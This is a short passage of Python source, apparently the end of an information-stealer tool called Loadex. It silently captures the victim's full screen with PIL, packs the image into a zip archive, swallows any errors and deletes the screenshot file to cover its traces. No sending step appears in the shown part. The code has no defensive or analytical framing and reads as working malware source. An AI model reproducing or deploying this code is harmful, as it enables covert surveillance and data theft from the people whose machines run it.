            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            import PIL.ImageGrab

            screenshot = PIL.ImageGrab.grab(bbox=(0, 0, width, height))
            screenshot.save(screenshot_image_path)

            zip_file.write(
                screenshot_image_path,
                os.path.join("Screenshot", "screenshot_capture.png"),
            )
        except:
            pass

        if os.path.exists(screenshot_image_path):
            Loadex().delete_file(screenshot_image_path)
            return True
        else:
            return False


if __name__ == "__main__":
    Loadex = Loadex()
    Loadex.main()
